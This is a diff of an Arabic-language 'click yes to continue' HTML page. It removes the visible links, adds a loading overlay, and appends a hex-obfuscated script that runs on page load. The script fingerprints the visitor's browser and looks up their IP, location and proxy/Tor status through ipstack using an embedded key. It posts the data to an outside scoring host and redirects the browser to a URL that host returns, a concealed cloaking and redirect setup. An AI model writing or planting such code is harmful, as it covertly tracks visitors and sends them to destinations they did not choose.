@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -24,10 +25,134 @@
 		  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
 		<![endif]-->
 
+        <style>
+            /* Absolute Center Spinner */
+.loading {
+  position: fixed;
+  z-index: 999;
+  height: 2em;
+  width: 2em;
+  overflow: show;
+  margin: auto;
+  top: 0;
+  left: 0;
+  bottom: 0;
+  right: 0;
+}
+
+/* Transparent Overlay */
+.loading:before {
+  content: '';
+  display: block;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+    background: radial-gradient(rgba(20, 20, 20,.6), rgba(0, 0, 0, .6));
+
+  background: -webkit-radial-gradient(rgba(20, 20, 20,.6), rgba(0, 0, 0,.6));
+}
+
+/* :not(:required) hides these rules from IE9 and below */
+.loading:not(:required) {
+  /* hide "loading..." text */
+  font: 0/0 a;
+  color: transparent;
+  text-shadow: none;
+  background-color: transparent;
+  border: 0;
+}
+
+.loading:not(:required):after {
+  content: '';
+  display: block;
+  font-size: 10px;
+  width: 1em;
+  height: 1em;
+  margin-top: -0.5em;
+  -webkit-animation: spinner 150ms infinite linear;
+  -moz-animation: spinner 150ms infinite linear;
+  -ms-animation: spinner 150ms infinite linear;
+  -o-animation: spinner 150ms infinite linear;
+  animation: spinner 150ms infinite linear;
+  border-radius: 0.5em;
+  -webkit-box-shadow: rgba(255,255,255, 0.75) 1.5em 0 0 0, rgba(255,255,255, 0.75) 1.1em 1.1em 0 0, rgba(255,255,255, 0.75) 0 1.5em 0 0, rgba(255,255,255, 0.75) -1.1em 1.1em 0 0, rgba(255,255,255, 0.75) -1.5em 0 0 0, rgba(255,255,255, 0.75) -1.1em -1.1em 0 0, rgba(255,255,255, 0.75) 0 -1.5em 0 0, rgba(255,255,255, 0.75) 1.1em -1.1em 0 0;
+box-shadow: rgba(255,255,255, 0.75) 1.5em 0 0 0, rgba(255,255,255, 0.75) 1.1em 1.1em 0 0, rgba(255,255,255, 0.75) 0 1.5em 0 0, rgba(255,255,255, 0.75) -1.1em 1.1em 0 0, rgba(255,255,255, 0.75) -1.5em 0 0 0, rgba(255,255,255, 0.75) -1.1em -1.1em 0 0, rgba(255,255,255, 0.75) 0 -1.5em 0 0, rgba(255,255,255, 0.75) 1.1em -1.1em 0 0;
+}
+
+/* Animation */
+
+@-webkit-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-moz-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@-o-keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes spinner {
+  0% {
+    -webkit-transform: rotate(0deg);
+    -moz-transform: rotate(0deg);
+    -ms-transform: rotate(0deg);
+    -o-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+</style>
+
 </head>
 
 <body>
-
+<div class="loading">Loading&#8230;</div>
 	<div id="notfound">
 		<div class="notfound-bg"></div>
 		<div class="notfound">
@@ -35,8 +160,9 @@
 				<h1>انتقل إلى الموقع</h1>
 			</div>
 			<h2>انقر فوق الزر نعم</h2>
-			<a href="https://dos-news.com/business/aliexpress-sale-calendar-2020.html" class="home-btn">نعم</a>
-			<a href="https://dos-news.com/business/aliexpress-sale-calendar-2020.html" class="contact-btn">لا</a>
+         
+		   <a href="javascript:void(0);" class="home-btn">نعم</a>
+                <a href="javascript:void(0);" class="contact-btn">لا</a>
 			<div class="notfound-social">
 				<a href="#"><i class="fa fa-facebook"></i></a>
 				<a href="#"><i class="fa fa-twitter"></i></a>
@@ -46,6 +172,11 @@
 		</div>
 	</div>
 
+<script>
+var extFlag = 0;
+</script>
+<script>var _0xf259=["\x73\x63\x72\x69\x70\x74","\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74\x32","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x64","\x6F\x6E\x6C\x6F\x61\x64","\x66\x6F\x72\x6D","\x61\x63\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x64\x2D\x73\x63\x6F\x72\x65\x2E\x79\x79\x79\x2D\x6E\x65\x74\x2E\x63\x6F\x6D\x2F\x63\x68\x65\x63\x6B\x2F\x37\x39\x34\x36\x62\x36\x63\x61\x65\x63\x35\x65\x35\x65\x63\x38\x34\x63\x65\x62\x39\x34\x31\x34\x64\x61\x36\x62\x32\x36\x36\x36","\x6D\x65\x74\x68\x6F\x64","\x50\x4F\x53\x54","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x6B\x65\x79","\x76\x61\x6C\x75\x65","\x6D\x61\x70","\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x73\x74\x61\x63\x6B\x2E\x63\x6F\x6D\x2F\x63\x68\x65\x63\x6B\x3F\x61\x63\x63\x65\x73\x73\x5F\x6B\x65\x79\x3D\x32\x37\x35\x30\x65\x33\x32\x62\x39\x37\x32\x30\x39\x38\x39\x38\x35\x39\x32\x65\x61\x35\x38\x33\x35\x33\x35\x31\x34\x66\x62\x66\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D\x31\x26\x73\x65\x63\x75\x72\x69\x74\x79\x3D\x31","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x44\x4F\x4E\x45","\x73\x74\x61\x74\x75\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x69\x70","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x67\x65\x6F\x6E\x61\x6D\x65\x5F\x69\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x73\x6E","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x69\x73\x5F\x70\x72\x6F\x78\x79","\x73\x65\x63\x75\x72\x69\x74\x79","\x69\x73\x5F\x63\x72\x61\x77\x6C\x65\x72","\x69\x73\x5F\x74\x6F\x72","\x74\x68\x72\x65\x61\x74\x5F\x6C\x65\x76\x65\x6C","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x72\x65\x67\x69\x6F\x6E\x5F\x63\x6F\x64\x65","\x61\x73\x73\x69\x67\x6E","\x69\x6E\x70\x75\x74","\x74\x79\x70\x65","\x68\x69\x64\x64\x65\x6E","\x6E\x61\x6D\x65","\x75\x72\x6C","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x58\x2D\x52\x65\x71\x75\x65\x73\x74\x65\x64\x2D\x57\x69\x74\x68","\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x65\x6E\x64","","\x6A\x6F\x69\x6E","\x78\x36\x34\x68\x61\x73\x68\x31\x32\x38","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x6C\x6F\x72\x44\x65\x70\x74\x68","\x64\x65\x76\x69\x63\x65\x4D\x65\x6D\x6F\x72\x79","\x73\x65\x73\x73\x69\x6F\x6E\x53\x74\x6F\x72\x61\x67\x65","\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65","\x63\x70\x75\x43\x6C\x61\x73\x73","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x77\x65\x62\x67\x6C\x56\x65\x6E\x64\x6F\x72\x41\x6E\x64\x52\x65\x6E\x64\x65\x72\x65\x72","\x68\x61\x73\x4C\x69\x65\x64\x4C\x61\x6E\x67\x75\x61\x67\x65\x73","\x68\x61\x73\x4C\x69\x65\x64\x52\x65\x73\x6F\x6C\x75\x74\x69\x6F\x6E","\x68\x61\x73\x4C\x69\x65\x64\x4F\x73","\x68\x61\x73\x4C\x69\x65\x64\x42\x72\x6F\x77\x73\x65\x72","\x61\x75\x64\x69\x6F","\x67\x65\x74","\x72\x65\x71\x75\x65\x73\x74\x49\x64\x6C\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x72\x63","\x2F\x2F\x63\x64\x6E\x6A\x73\x2E\x63\x6C\x6F\x75\x64\x66\x6C\x61\x72\x65\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x6C\x69\x62\x73\x2F\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74\x6A\x73\x32\x2F\x32\x2E\x31\x2E\x30\x2F\x66\x69\x6E\x67\x65\x72\x70\x72\x69\x6E\x74\x32\x2E\x6D\x69\x6E\x2E\x6A\x73","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];(function(_0xd5a6x1,_0xd5a6x2,_0xd5a6x3){var _0xd5a6x4,_0xd5a6x5=_0xd5a6x1[_0xf259[2]](_0xd5a6x2)[0];if(_0xd5a6x1[_0xf259[3]](_0xd5a6x3)){return};_0xd5a6x4= _0xd5a6x1[_0xf259[4]](_0xd5a6x2);_0xd5a6x4[_0xf259[5]]= _0xd5a6x3;_0xd5a6x4[_0xf259[6]]= function(){var _0xd5a6x6=document[_0xf259[4]](_0xf259[7]);_0xd5a6x6[_0xf259[8]]= _0xf259[9];_0xd5a6x6[_0xf259[10]]= _0xf259[11];document[_0xf259[13]][_0xf259[12]](_0xd5a6x6);var _0xd5a6x7=null,_0xd5a6x8=null,_0xd5a6x9={extFlag:extFlag},_0xd5a6xa=null;function _0xd5a6xb(_0xd5a6xc){var _0xd5a6xd={};_0xd5a6xc[_0xf259[16]](function(_0xd5a6xe){_0xd5a6xd[_0xd5a6xe[_0xf259[14]]]= _0xd5a6xe[_0xf259[15]]});return _0xd5a6xd}function _0xd5a6xf(){var _0xd5a6x10= new XMLHttpRequest();_0xd5a6x10[_0xf259[19]](_0xf259[17],_0xf259[18],true);_0xd5a6x10[_0xf259[20]]= function(){if(this[_0xf259[21]]=== XMLHttpRequest[_0xf259[22]]&& this[_0xf259[23]]=== 200){var _0xd5a6x11=JSON[_0xf259[25]](_0xd5a6x10[_0xf259[24]]);_0xd5a6x7= {ip:_0xd5a6x11[_0xf259[26]],hostname:_0xd5a6x11[_0xf259[27]],latitude:_0xd5a6x11[_0xf259[28]],longitude:_0xd5a6x11[_0xf259[29]],geoname_id:_0xd5a6x11[_0xf259[31]][_0xf259[30]],asn:_0xd5a6x11[_0xf259[33]][_0xf259[32]],is_proxy:_0xd5a6x11[_0xf259[35]][_0xf259[34]]?1:0,is_crawler:_0xd5a6x11[_0xf259[35]][_0xf259[36]]?1:0,is_tor:_0xd5a6x11[_0xf259[35]][_0xf259[37]]?1:0,threat_level:_0xd5a6x11[_0xf259[35]][_0xf259[38]],country_code:_0xd5a6x11[_0xf259[39]],region_code:_0xd5a6x11[_0xf259[40]]};_0xd5a6x9= Object[_0xf259[41]](_0xd5a6x9,_0xd5a6x7,_0xd5a6x8);for(var _0xd5a6x12 in _0xd5a6x9){var _0xd5a6x13=document[_0xf259[4]](_0xf259[42]);_0xd5a6x13[_0xf259[43]]= _0xf259[44];_0xd5a6x13[_0xf259[45]]= _0xd5a6x12;_0xd5a6x13[_0xf259[15]]= _0xd5a6x9[_0xd5a6x12];_0xd5a6x6[_0xf259[12]](_0xd5a6x13)};document[_0xf259[13]][_0xf259[12]](_0xd5a6x6);var _0xd5a6x14= new XMLHttpRequest();_0xd5a6x14[_0xf259[19]](_0xf259[11],_0xd5a6x6[_0xf259[8]],true);_0xd5a6x14[_0xf259[20]]= function(){if(this[_0xf259[21]]=== XMLHttpRequest[_0xf259[22]]&& this[_0xf259[23]]=== 200){var _0xd5a6x11=JSON[_0xf259[25]](this[_0xf259[24]]);if(_0xd5a6x11[_0xf259[23]]){if(_0xd5a6x11[_0xf259[46]]&& _0xd5a6x11[_0xf259[46]][_0xf259[47]]){window[_0xf259[31]][_0xf259[48]](_0xd5a6x11[_0xf259[46]])}}}};var _0xd5a6x15= new FormData(_0xd5a6x6);_0xd5a6x14[_0xf259[51]](_0xf259[49],_0xf259[50]);_0xd5a6x14[_0xf259[52]](_0xd5a6x15)}};_0xd5a6x10[_0xf259[52]]()}function _0xd5a6x16(){var _0xd5a6x17=Fingerprint2[_0xf259[71]](function(_0xd5a6x18){var _0xd5a6x19=_0xd5a6x18[_0xf259[16]](function(_0xd5a6x1a){return _0xd5a6x1a[_0xf259[15]]});var _0xd5a6x1b=_0xd5a6xb(_0xd5a6x18);_0xd5a6xa= Fingerprint2[_0xf259[55]](_0xd5a6x19[_0xf259[54]](_0xf259[53]),31);_0xd5a6x8= {hash:_0xd5a6xa,userAgent:_0xd5a6x1b[_0xf259[56]],webdriver:_0xd5a6x1b[_0xf259[57]]?1:0,hardwareConcurrency:_0xd5a6x1b[_0xf259[58]],colorDepth:_0xd5a6x1b[_0xf259[59]],deviceMemory:_0xd5a6x1b[_0xf259[60]],sessionStorage:_0xd5a6x1b[_0xf259[61]]?1:0,localStorage:_0xd5a6x1b[_0xf259[62]]?1:0,cpuClass:_0xd5a6x1b[_0xf259[63]],platform:_0xd5a6x1b[_0xf259[64]],webglVendorAndRenderer:_0xd5a6x1b[_0xf259[65]],hasLiedLanguages:_0xd5a6x1b[_0xf259[66]]?1:0,hasLiedResolution:_0xd5a6x1b[_0xf259[67]]?1:0,hasLiedOs:_0xd5a6x1b[_0xf259[68]]?1:0,hasLiedBrowser:_0xd5a6x1b[_0xf259[69]]?1:0,audio:_0xd5a6x1b[_0xf259[70]]};_0xd5a6xf()})}if(window[_0xf259[72]]){requestIdleCallback(_0xd5a6x16)}else {setTimeout(_0xd5a6x16,500)}};_0xd5a6x4[_0xf259[73]]= _0xf259[74];_0xd5a6x5[_0xf259[76]][_0xf259[75]](_0xd5a6x4,_0xd5a6x5)}(document,_0xf259[0],_0xf259[1]))</script>
 </body>
 
 </html>
+
